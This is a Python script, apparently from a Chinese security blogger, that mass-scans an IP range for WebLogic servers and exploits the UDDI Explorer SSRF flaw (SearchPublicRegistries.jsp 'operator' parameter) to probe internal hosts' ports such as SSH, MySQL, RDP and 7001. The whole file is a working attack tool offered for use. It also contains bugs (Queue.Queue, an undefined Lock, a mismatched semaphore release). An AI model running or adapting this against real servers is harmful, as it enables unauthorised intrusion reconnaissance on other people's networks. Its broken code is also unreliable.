# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun


import re
import sys
from queue import Queue
import threading
import optparse
import requests
import time
from IPy import IP

printLock = threading.Semaphore(1)  #lock Screen print
TimeOut = 5  #request timeout
ports = ['80','8080']
exp_ports = ['21','22','23','53','80','443','3306','3389','8080','7001']

#User-Agent
header = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36','Connection':'close'}

class scan():

  def __init__(self,cidr,threads_num):
    self.threads_num = threads_num
    self.cidr = IP(cidr)
    #build ip queue
    self.IPs = Queue.Queue()
    for ip in self.cidr:
      ip = str(ip)
      self.IPs.put(ip)

  def request(self):
    with threading.Lock():
      while self.IPs.qsize() > 0:
        ip = self.IPs.get()
        for port in ports:
          try:
            r_test = requests.Session().get('http://%s:%s/uddiexplorer/SetupUDDIExplorer.jsp'%(str(ip),str(port)),headers=header,timeout=TimeOut)
            if r_test.status_code == 200:
              #printLock.acquire()
              print ("|%-16s|%-6s|" % (ip,port))
              print ("+----------------+------+")
              regex = 'http://(.*)/uddi/uddilistener'
              ip_ssrf = re.findall(regex, r_test.content)[0]
              if ip_ssrf != '':
                index = ip_ssrf.index(':')
                ip_ssrf =  ip_ssrf[:index]
                for exp_port in exp_ports:
                  r = requests.Session().get('http://%s:%s/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'%(str(ip),str(port),str(ip_ssrf),str(exp_port)),headers=header,timeout=TimeOut)
                  re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',r.content)
                  re_sult2 = re.findall('No route to host',r.content)
                  re_sult3 = re.findall('but could not connect',r.content)
                  if len(re_sult1)!=0 and len(re_sult2)==0 and len(re_sult3)==0:
                    print("|%-16s|%-6s|%-16s|%-6s|" % (str(ip),str(port),str(ip),str(exp_port)))
                    print ("+----------------+------+----------------+------+")
            with open("./log/"+self.cidr.strNormal(3)+".log",'a') as f:
              f.write(ip+"\n")

          except Exception as e:
            print (e)
            Lock.acquire()
          finally:
            printLock.release()

  #Multi thread
  def run(self):
    for i in range(self.threads_num):
      t = threading.Thread(target=self.request)
      t.start()

if __name__ == "__main__":
  parser = optparse.OptionParser("Usage: %prog [options] target")
  parser.add_option("-t", "--thread", dest = "threads_num",
    default = 1, type = "int",
    help = "[optional]number of  theads,default=10")
  (options, args) = parser.parse_args()
  if len(args) < 1:
    parser.print_help()
    sys.exit(0)
  print ("+----------------+------+----------------+------+")
  print ("|     IP         |port  |ssrf_ip         |port  |")
  print ("+----------------+------+----------------+------+")

  s = scan(cidr=args[0],threads_num=options.threads_num)
  s.run()